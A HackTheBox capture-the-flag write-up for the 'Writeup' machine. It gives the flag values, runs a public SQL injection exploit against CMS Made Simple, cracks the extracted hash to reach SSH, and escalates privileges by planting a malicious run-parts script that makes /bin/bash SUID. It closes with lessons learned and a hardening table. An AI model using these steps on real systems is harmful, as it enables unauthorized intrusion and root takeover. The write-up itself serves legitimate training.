# HackTheBox - Writeup

**Platform:** HackTheBox  
**Difficulty:** Easy  
**Status:** ✅ RETIRED  
**Date Completed:** 2026-03-22  

| Flag | Value |
|------|-------|
| User | `539606a7825e5fd092f0e5afa6bd36f2` |
| Root | `54e1ac1559a7a0e102dfa164fc029ab2` |

---

## Executive Summary

**Writeup** is an easy-difficulty Linux machine hosting a CMS Made Simple website vulnerable to an unauthenticated time-based blind SQL injection. The exploit extracts user credentials which provide SSH access. Privilege escalation exploits a classic PATH hijacking vulnerability in the PAM MOTD configuration — the `staff` group membership grants write access to `/usr/local/bin`, which appears early in the PATH during SSH login, allowing a malicious `run-parts` binary to execute as root.

---

## Attack Chain Overview

```
┌─────────────────────────────────────────────────────────────────┐
│  1. Web Enum     → Port 80: CMS Made Simple                     │
│  2. SQLi         → EDB-46635: Time-based blind SQLi            │
│  3. Crack        → Hashcat: jkr / raykayjay9                   │
│  4. SSH          → Initial shell as jkr                         │
│  5. Enum         → staff group → /usr/local/bin writable       │
│  6. Privesc      → PATH hijack via pam_motd.so                  │
│  7. Root         → SUID bash → Root shell                      │
└─────────────────────────────────────────────────────────────────┘
```

---

## Initial Access

### 1. Web Enumeration
- **Port 80**: CMS Made Simple installation at `/writeup`
- **Nmap**: Port 80 open, SSH on 22 (localhost only)

### 2. SQL Injection Exploitation

**Vulnerability:** Unauthenticated time-based blind SQL Injection  
**Exploit:** [EDB-46635](https://www.exploit-db.com/exploits/46635)

```bash
# Extract credentials via SQLi
python3 46635.py -u http://10.129.191.3/writeup

# Output:
# [+] Salt for password found: 5a599ef579066807
# [+] Username found: jkr
# [+] Email found: jkr@writeup.htb
# [+] Password hash found: 62def4866937f08cc13bab43bb14e6f7
```

**Cracking the Hash:**
```bash
# Hashcat mode 20: hash:salt with MD5
hashcat -m 20 '62def4866937f08cc13bab43bb14e6f7:5a599ef579066807' rockyou.txt
# Result: raykayjay9
```

### 3. SSH Access
```bash
ssh jkr@10.129.191.3
# Password: raykayjay9
```

---

## Privilege Escalation

### Vulnerability Analysis

**PAM Configuration** (`/etc/pam.d/sshd`):
```
session optional pam_motd.so motd=/run/motd.dynamic
```

**What happens on SSH login:**
```
pam_motd.so → executes → run-parts --lsbsysinit /etc/update-motd.d
                         ↑
                 Called WITHOUT full path
                         ↓
              PATH lookup → /usr/local/bin/run-parts
                         ↓
                   (runs as root)
```

**Why it works:**
| Factor | Detail |
|--------|--------|
| User `jkr` | Member of `staff` group |
| `staff` group | Write access to `/usr/local/bin` |
| PATH order | `/usr/local/bin` appears early in PATH |
| Execution | Runs as root via PAM |

### Exploitation

```bash
# 1. Create malicious run-parts binary
cat > /usr/local/bin/run-parts << 'EOF'
#!/bin/bash
chmod u+s /bin/bash
EOF
chmod +x /usr/local/bin/run-parts

# 2. Trigger via SSH login
ssh jkr@10.129.191.3

# 3. Get root shell
/bin/bash -p
# root

# 4. Capture root flag
cat /root/root.txt
54e1ac1559a7a0e102dfa164fc029ab2
```

### Failed Privesc Attempts

| Method | Target | Reason |
|--------|--------|--------|
| PwnKit (CVE-2021-4034) | pkexec 0.105 | System patched |
| MySQL Access | 127.0.0.1:3306 | No valid credentials |
| Looney Tunables (CVE-2023-4911) | GLIBC 2.36 | Exploit didn't trigger |
| OverlayFS (CVE-2023-0386) | Kernel 6.1 | Module not loaded |

---

## Key Lessons Learned

1. **Time-based SQLi requires tuning** — 3-second delay provided stable extraction
2. **Group memberships matter** — `staff` group provided write access to critical PATH
3. **PATH hijacking remains viable** — Unqualified command calls in privileged contexts are dangerous
4. **Process monitoring is essential** — `pspy` revealed the vulnerable execution pattern
5. **Failed exploits narrow the search** — Documenting attempts accelerates finding the real path

---

## Prevention & Hardening

| Issue | Fix |
|-------|-----|
| Unqualified `run-parts` call | Use absolute path: `/usr/bin/run-parts` |
| Writable PATH directories | Remove `/usr/local/bin` from root's PATH |
| PAM misconfiguration | Audit PAM configs for unqualified command calls |
| SQLi vulnerability | Keep CMS Made Simple updated |

---

## Documentation Reference

Full technical details available in:
- `/retired/Writeup/recon.md` — Reconnaissance findings
- `/retired/Writeup/exploit.md` — Complete exploitation walkthrough
- `/retired/Writeup/privesc.md` — Privilege escalation deep-dive
- `/retired/Writeup/raw_data/` — Raw enumeration data and notes

---

**Box Status:** ARCHIVED ✅  
**Documentation:** COMPLETE ✅  
**Difficulty Rating:** Easy (appropriate)  
**Time to Root:** ~1 hour
